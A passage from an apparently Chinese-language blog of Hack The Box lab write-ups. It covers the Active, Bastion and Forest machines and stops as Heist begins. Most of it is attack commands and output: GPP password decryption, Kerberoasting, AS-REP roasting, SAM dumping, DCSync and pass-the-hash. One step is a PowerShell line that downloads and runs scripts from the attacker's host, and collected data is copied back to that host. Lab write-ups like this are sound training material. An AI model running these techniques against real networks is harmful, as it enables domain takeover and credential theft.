class="string">&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot;</span> name=<span class="string">&quot;active.htb\SVC_TGS&quot;</span> image=<span class="string">&quot;2&quot;</span> changed=<span class="string">&quot;2018-07-18 20:46:06&quot;</span> uid=<span class="string">&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;</span>&gt;&lt;Properties action=<span class="string">&quot;U&quot;</span> newName=<span class="string">&quot;&quot;</span> fullName=<span class="string">&quot;&quot;</span> description=<span class="string">&quot;&quot;</span> cpassword=<span class="string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> changeLogon=<span class="string">&quot;0&quot;</span> noChange=<span class="string">&quot;1&quot;</span> neverExpires=<span class="string">&quot;1&quot;</span> acctDisabled=<span class="string">&quot;0&quot;</span> userName=<span class="string">&quot;active.htb\SVC_TGS&quot;</span>/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure><p>解密得到明文密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><br><span class="line">GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure><p>这里本来以为是用<code>evil-winrm</code>或者<code>psexec</code>Getshell的，没想到是smb登入<code>users</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18</span><br><span class="line">get svc_tgs\desktop\user.txt</span><br><span class="line"></span><br><span class="line">cat svc_tgs\\desktop\\user.txt </span><br><span class="line">86d67d8ba232bb6a254aa4d10159e983</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>Kerberoasting</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile getuserspns.out</span><br></pre></td></tr></table></figure><p>（跑的时候出了个时间差过大的错误，头疼）<br />同步时间</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -u 10.10.10.100</span><br></pre></td></tr></table></figure><p>爆破票据</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs getuserspns.out </span><br><span class="line"></span><br><span class="line">Ticketmaster1968 (?)</span><br></pre></td></tr></table></figure><p>查看SMB路径权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100 -u administrator -p Ticketmaster1968</span><br><span class="line"></span><br><span class="line">Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            READ, WRITERemote Admin</span><br><span class="line">attacker_folder                                   READ, WRITE</span><br><span class="line">C$                                                READ, WRITEDefault share</span><br><span class="line">IPC$                                              NO ACCESSRemote IPC</span><br><span class="line">NETLOGON                                          READ, WRITELogon server share </span><br><span class="line">Replication                                       READ ONLY</span><br><span class="line">SYSVOL                                            READ, WRITELogon server share </span><br><span class="line">Users</span><br></pre></td></tr></table></figure><p>有写权限，直接psexec</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py active.htb/administrator@10.10.10.100</span><br><span class="line">Ticketmaster1968</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> \users\administrator\desktop\root.txt</span><br><span class="line">b5fc76d1d6b91d77b2fbf2d54d0f708b</span><br></pre></td></tr></table></figure><hr /><h1 id="bastion"><a class="markdownIt-Anchor" href="#bastion"></a> Bastion</h1><h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.134</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.134</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p>smbmap扫描路径</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.134 -u <span class="built_in">test</span></span><br><span class="line">Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">Backups                                           READ, WRITE</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br></pre></td></tr></table></figure><p>可以看到有两个VHD文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.134/backups</span><br><span class="line"></span><br><span class="line">dir WindowsImageBackup\L4mpje-PC\&quot;Backup 2019-02-22 124351<span class="string">&quot;\</span></span><br><span class="line"><span class="string">  .                                  Dn        0  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  ..                                 Dn        0  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 20:44:03 2019</span></span><br><span class="line"><span class="string">  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  BackupSpecs.xml                    An     1186  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string">  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 20:45:32 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7735807 blocks of size 4096. 2757267 blocks available</span></span><br></pre></td></tr></table></figure><p>先挂载SMB服务的文件，再将VHD文件挂载到本地磁盘</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/vhd</span><br><span class="line">mkdir /tmp/l4mpje-pc</span><br><span class="line">mount -t cifs //10.10.10.134/backups/WindowsImageBackup/L4mpje-PC  /tmp/l4mpje-pc/ -o user=anonymous</span><br><span class="line">modprobe nbd max_part=16</span><br><span class="line">qemu-nbd -r -c /dev/nbd0 <span class="string">&quot;/tmp/l4mpje-pc/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd&quot;</span></span><br><span class="line">mount -r /dev/nbd0p1 /tmp/vhd</span><br></pre></td></tr></table></figure><p>复制SAM文件和SYSTEM文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /tmp/vhd/Windows/System32/config/SYSTEM /root/</span><br><span class="line">cp /tmp/vhd/Windows/System32/config/SAM /root/</span><br></pre></td></tr></table></figure><p>取消挂载</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">umount /tmp/vhd</span><br><span class="line">qemu-nbd -d /dev/nbd0</span><br><span class="line">rmmod nbd</span><br><span class="line">umount /tmp/l4mpje-pc</span><br></pre></td></tr></table></figure><p>dump出Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py <span class="built_in">local</span> -system /root/SYSTEM -sam /root/SAM</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>解密得到明文</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">bureaulampje     (?)</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">bureaulampje</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> Desktop\user.txt                                                                            </span><br><span class="line">9bfe57d5c3309db3a151772f9d86c6cd</span><br></pre></td></tr></table></figure><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><p>找到<code>mRemoteNG</code>程序的凭证储存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> \Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml</span><br><span class="line"></span><br><span class="line">Username=<span class="string">&quot;Administrator&quot;</span> Domain=<span class="string">&quot;&quot;</span> Password=<span class="string">&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;</span></span><br></pre></td></tr></table></figure><p>还原管理员口令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/master/mremoteng_decrypt.py</span><br><span class="line">python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==</span><br><span class="line"></span><br><span class="line">Password: thXLHM96BeKL0ER2</span><br></pre></td></tr></table></figure><p>ssh登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh administrator@10.10.10.134</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line"><span class="built_in">type</span> \Users\Administrator\Desktop\root.txt                    </span><br><span class="line"></span><br><span class="line">958850b91811676ed6620a9c430e65c8</span><br></pre></td></tr></table></figure><hr /><h1 id="forest"><a class="markdownIt-Anchor" href="#forest"></a> Forest</h1><h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.161</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.161</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">53/tcp   open  domain       Microsoft DNS</span><br><span class="line">88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-05 14:34:46Z)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2><p>还是DC</p><p>跑出来域名和一些用户名</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.10.161</span><br><span class="line"></span><br><span class="line"> =========================================== </span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 10.10.10.161    |</span><br><span class="line"> =========================================== </span><br><span class="line">Domain Name: HTB</span><br><span class="line">Domain Sid: S-1-5-21-3072663084-364016917-1341370565</span><br><span class="line">[+] Host is part of a domain (not a workgroup)</span><br><span class="line"></span><br><span class="line">-----</span><br><span class="line"></span><br><span class="line"> ============================= </span><br><span class="line">|    Users on 10.10.10.161    |</span><br><span class="line"> ============================= </span><br><span class="line">user:[Administrator] rid:[0x1f4]</span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[DefaultAccount] rid:[0x1f7]</span><br><span class="line">user:[<span class="variable">$331000</span>-VK4ADACQNUCA] rid:[0x463]</span><br><span class="line">user:[SM_2c8eef0a09b545acb] rid:[0x464]</span><br><span class="line">user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]</span><br><span class="line">user:[SM_75a538d3025e4db9a] rid:[0x466]</span><br><span class="line">user:[SM_681f53d4942840e18] rid:[0x467]</span><br><span class="line">user:[SM_1b41c9286325456bb] rid:[0x468]</span><br><span class="line">user:[SM_9b69f1b9d2cc45549] rid:[0x469]</span><br><span class="line">user:[SM_7c96b981967141ebb] rid:[0x46a]</span><br><span class="line">user:[SM_c75ee099d0a64c91b] rid:[0x46b]</span><br><span class="line">user:[SM_1ffab36a2f5f479cb] rid:[0x46c]</span><br><span class="line">user:[HealthMailboxc3d7722] rid:[0x46e]</span><br><span class="line">user:[HealthMailboxfc9daad] rid:[0x46f]</span><br><span class="line">user:[HealthMailboxc0a90c9] rid:[0x470]</span><br><span class="line">user:[HealthMailbox670628e] rid:[0x471]</span><br><span class="line">user:[HealthMailbox968e74d] rid:[0x472]</span><br><span class="line">user:[HealthMailbox6ded678] rid:[0x473]</span><br><span class="line">user:[HealthMailbox83d6781] rid:[0x474]</span><br><span class="line">user:[HealthMailboxfd87238] rid:[0x475]</span><br><span class="line">user:[HealthMailboxb01ac64] rid:[0x476]</span><br><span class="line">user:[HealthMailbox7108a4e] rid:[0x477]</span><br><span class="line">user:[HealthMailbox0659cc1] rid:[0x478]</span><br><span class="line">user:[sebastien] rid:[0x479]</span><br><span class="line">user:[lucinda] rid:[0x47a]</span><br><span class="line">user:[svc-alfresco] rid:[0x47b]</span><br><span class="line">user:[andy] rid:[0x47e]</span><br><span class="line">user:[mark] rid:[0x47f]</span><br><span class="line">user:[santi] rid:[0x480]</span><br></pre></td></tr></table></figure><blockquote><p>Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.</p></blockquote><blockquote><p><a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting">https://0xdf.gitlab.io/2020/03/21/htb-forest.html#as-rep-roasting</a></p></blockquote><p>AS-REP Roasting</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py HTB/svc-alfresco -request -no-pass -dc-ip 10.10.10.161</span><br><span class="line">Impacket v0.9.23.dev1 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> svc-alfresco</span><br><span class="line">$krb5asrep$23<span class="variable">$svc</span>-alfresco@HTB:74aacc88dcebdc99fbdfad38ea7bfb86<span class="variable">$0f390178e508b52f3547f4784f435ca5955e6086b719aab1723ec0d13c900d4b0b7e4a00c10162b5615fb8c93e90f34a1746b5de60400cac0a2eae9ecab1a1d16f1d41958d72811ba73835e3177ea538e77888a207a47537c83644879fa792b5d31b965dd75aef7409dc34ba0b2df67eb987db6779846f330d563277f97e004484f67e7a853beec8e7552b427ac4c43fabd3f523a365f80a43f90f587ee08bbc8d06ad907d9efc5a6541714f92fe3c7626dd539daa45d54a4ef5733579277c65f7d11ca380184131a767428ca62077e4553fd8d86d1e7340da4b41b115357485</span></span><br></pre></td></tr></table></figure><p>爆破口令明文</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">s3rvice          ($krb5asrep$23<span class="variable">$svc</span>-alfresco@HTB)</span><br></pre></td></tr></table></figure><p>evil-winrm登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</span><br><span class="line"><span class="built_in">type</span> C:\users\svc-alfresco\desktop\user.txt</span><br><span class="line"></span><br><span class="line">e5e4e47ae7022664cda6eb013fb0d9ed</span><br></pre></td></tr></table></figure><h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2><p>下载bloodhound的powershell版本的collector，开启HTTP服务和SMB服务(impacket)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1</span><br><span class="line">wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</span><br><span class="line">python -m http.server 9998&amp;</span><br><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp;</span><br></pre></td></tr></table></figure><p>靶机上下载bloodhound collector并回传输出文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&quot;http://10.10.16.11:9998/PowerView.ps1&quot;</span>)</span><br><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&quot;http://10.10.16.11:9998/SharpHound.ps1&quot;</span>)</span><br><span class="line">powershell -<span class="built_in">exec</span> bypass</span><br><span class="line">invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</span><br><span class="line">net use \\10.10.16.11\Bufferfly /u:Buffer fly</span><br><span class="line">copy 20210705223815_BloodHound.zip \\10.10.16.11\Bufferfly\</span><br><span class="line">net use /d \\10.10.16.11\Bufferfly</span><br></pre></td></tr></table></figure><p>bloodhound的内容实在是看不懂，看了WP<br />大概思路是</p><ol><li>用户&quot;svc-alfresco&quot;拥有账户操作权限，可以创建域账户</li><li>用户&quot;svc-alfresco&quot;完全控制&quot;Exchange Windows Permissions&quot;组(GenericAll)，可以将&quot;svc-alfresco&quot;加入&quot;Exchange Windows Permissions&quot;组</li><li>&quot;Exchange Windows Permissions&quot;组可以修改域用户的ACL(WriteDacl)</li><li>用户&quot;svc-alfresco&quot;利用&quot;Exchange Windows Permissions&quot;组的权限赋予&quot;DCSync&quot;权限</li><li>利用这个域账户进行DCSync攻击</li></ol><p>添加域用户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user bufferfly bufferfly /add /domain</span><br></pre></td></tr></table></figure><p>执行命令后重新Getshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ADGroupMember -Identity <span class="string">&quot;Exchange Windows Permissions&quot;</span> -Members svc-alfresco</span><br></pre></td></tr></table></figure><p>查看组</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br><span class="line"></span><br><span class="line">HTB\Exchange Windows Permissions           Group            S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">HTB\Exchange Trusted Subsystem             Group            S-1-5-21-3072663084-364016917-1341370565-1119 Mandatory group, Enabled by default, Enabled grou</span><br></pre></td></tr></table></figure><p>添加DCSync权限(PowerView.ps1)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity <span class="string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity bufferfly -Rights DCSync</span><br></pre></td></tr></table></figure><p>DCSync攻击</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -just-dc <span class="string">&quot;htb/bufferfly:bufferfly@10.10.10.161&quot;</span></span><br><span class="line"></span><br><span class="line">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span><br></pre></td></tr></table></figure><p>Hash登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">f048153f202bbb2f82622b04d79129cc</span><br></pre></td></tr></table></figure><p>貌似svc-alfresco不是域用户，而DCSync的操作需要一个域用户的凭证</p><p>Powershell在运行命令时貌似会自动地从ps1文件载入函数，很方便</p><hr /><h1 id="heist"><a class="markdownIt-Anchor" href="#heist"></a> Heist</h1><h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.149</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.149</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-4"><a class="markdownIt-Anchor" 